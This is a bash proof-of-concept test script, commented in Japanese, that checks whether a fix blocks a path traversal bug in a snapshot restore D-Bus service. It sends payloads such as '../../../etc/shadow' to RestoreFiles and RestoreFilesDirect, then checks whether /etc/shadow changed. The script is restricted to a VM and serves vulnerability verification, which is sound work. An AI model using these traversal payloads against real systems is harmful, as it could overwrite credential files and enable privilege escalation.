#!/bin/bash
# poc_restore_traversal.sh - Issue #5a: RestoreFiles パストラバーサル
#
# ⚠️ 本PoCは /etc/shadow の mtime/inode を変化させる可能性あり。VM限定。
#
# シナリオ:
#   filePaths に `/.snapshots/N/snapshot/../../../etc/shadow` を渡し、
#   snapshot内のファイルではなくホストルートの /etc/shadow を書き換え
#   させることを試みる。修正版 (P0-4) では絶対パス検証 + weakly_canonical で
#   snapshot root 外へ脱出するパスを InvalidArgs で拒否する。

set -u
SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
source "$SCRIPT_DIR/common.sh"

assert_running_in_vm
assert_qsnapper_service

SNAP_ID=$(ensure_snapshot root)
log "Using snapshot ID=$SNAP_ID"

# 事前状態を記録
BEFORE=$(stat -c '%Y %i %s' /etc/shadow)
log "Before: /etc/shadow stat = $BEFORE"

# 悪性filePath候補
PAYLOADS=(
    "/.snapshots/$SNAP_ID/snapshot/../../../etc/shadow"
    "/etc/shadow"
    "etc/shadow"
    "/.snapshots/$SNAP_ID/snapshot/etc/../../../etc/shadow"
)

# 認証済み admin で叩く必要がある (alice を使う)
ALICE="${ALICE_USER:-alice}"

reproduced=0
for payload in "${PAYLOADS[@]}"; do
    log "Testing filePath=$payload"
    OUTPUT=$(sudo -u "$ALICE" dbus-send --system --print-reply \
        --dest="$DBUS_SERVICE" "$DBUS_PATH" \
        "${DBUS_IFACE}.RestoreFiles" \
        string:"root" int32:"$SNAP_ID" \
        array:string:"$payload" array:string:"c" 2>&1 || true)

    if echo "$OUTPUT" | grep -qE "Error.*InvalidArgs"; then
        log "  → blocked"
    elif echo "$OUTPUT" | grep -q "Error"; then
        log "  → error (possibly post-validation failure): $(echo "$OUTPUT" | head -1)"
    else
        log "  → WARNING: no validation error, call returned: $(echo "$OUTPUT" | head -1)"
        reproduced=1
    fi
done

# RestoreFilesDirect にも同じ確認
log "Re-running against RestoreFilesDirect"
for payload in "${PAYLOADS[@]}"; do
    OUTPUT=$(sudo -u "$ALICE" dbus-send --system --print-reply \
        --dest="$DBUS_SERVICE" "$DBUS_PATH" \
        "${DBUS_IFACE}.RestoreFilesDirect" \
        string:"root" int32:"$SNAP_ID" \
        array:string:"$payload" array:string:"c" 2>&1 || true)
    echo "$OUTPUT" | grep -qE "Error.*InvalidArgs" || reproduced=1
done

AFTER=$(stat -c '%Y %i %s' /etc/shadow)
log "After : /etc/shadow stat = $AFTER"
if [[ "$BEFORE" != "$AFTER" ]]; then
    log "CRITICAL: /etc/shadow was modified!"
    reproduced=1
fi

(( reproduced )) && report_result reproduced || report_result blocked
